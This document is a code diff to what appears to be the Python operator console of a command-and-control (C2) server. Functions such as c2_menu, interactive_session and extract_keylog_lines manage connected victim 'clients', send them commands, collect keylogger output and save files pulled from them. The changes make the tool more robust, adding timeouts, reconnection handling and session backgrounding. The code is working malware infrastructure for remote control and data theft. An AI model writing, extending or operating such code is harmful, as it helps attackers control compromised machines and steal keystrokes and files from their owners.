@@ -92,16 +92,22 @@ def accept_clients(manager: ClientManager):
         manager.add(conn, addr)
 
 
-def recv_until_prompt(conn, prompt=b">> "):
+def recv_until_prompt(conn, prompt=b"client >> ", timeout=15):
     data = b""
-    while True:
-        chunk = conn.recv(BUFFER_SIZE)
-        if not chunk:
-            return None
-        data += chunk
-        if data.endswith(prompt):
-            break
-    return data
+    conn.settimeout(timeout)
+    try:
+        while True:
+            chunk = conn.recv(BUFFER_SIZE)
+            if not chunk:
+                return None
+            data += chunk
+            if data.endswith(prompt):
+                break
+        return data
+    except socket.timeout:
+        return None
+    finally:
+        conn.settimeout(None)
 
 
 def send_chunked_file(conn, cmd_prefix, fname):
@@ -146,7 +152,11 @@ def parse_file_response(out):
 def interactive_session(conn, addr, cid: int, read_initial=True):
     prompt = ">> "
     if read_initial:
-        initial = recv_until_prompt(conn, prompt.encode())
+        try:
+            initial = recv_until_prompt(conn, prompt.encode(), timeout=30)
+        except KeyboardInterrupt:
+            print()
+            return "background"
         if initial is None:
             return "exit"
         init_text = initial.decode(errors="ignore")
@@ -154,7 +164,7 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
         print(init_text, end="", flush=True)
     while True:
         try:
-            line = input()
+            line = input(prompt)
         except (EOFError, KeyboardInterrupt):
             print()
             return "background"
@@ -162,7 +172,10 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
             continue
         line = line.strip()
         if line in ("exit", "quit", "/quit"):
-            conn.sendall((line + "\n").encode())
+            try:
+                conn.sendall((line + "\n").encode())
+            except Exception:
+                pass
             time.sleep(0.3)
             return "exit"
         if line == "background":
@@ -193,9 +206,17 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
                 conn.sendall(cmd.encode())
             else:
                 conn.sendall((line + "\n").encode())
-            response = recv_until_prompt(conn, prompt.encode())
+            conn.settimeout(15)
+            try:
+                response = recv_until_prompt(conn, prompt.encode())
+            except KeyboardInterrupt:
+                print()
+                return "background"
+            finally:
+                conn.settimeout(None)
             if response is None:
-                return False
+                print("[Connection lost]")
+                return "exit"
             out = response.decode(errors="ignore")
             extract_keylog_lines(cid, out)
             if out.endswith(prompt):
@@ -207,6 +228,9 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
                     f.write(fdata)
                 print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
             print(out, end="", flush=True)
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
+            print("\n[Connection lost]")
+            return "exit"
         except Exception as e:
             print(f"Error: {e}")
 
@@ -411,6 +435,9 @@ def c2_menu(manager: ClientManager):
             print("[Type exit/quit to return to menu]")
             try:
                 result = interactive_session(conn, addr, cid, read_initial=first_select)
+            except (EOFError, KeyboardInterrupt):
+                print()
+                result = "background"
             except Exception as e:
                 print(f"Session error: {e}")
                 result = "exit"
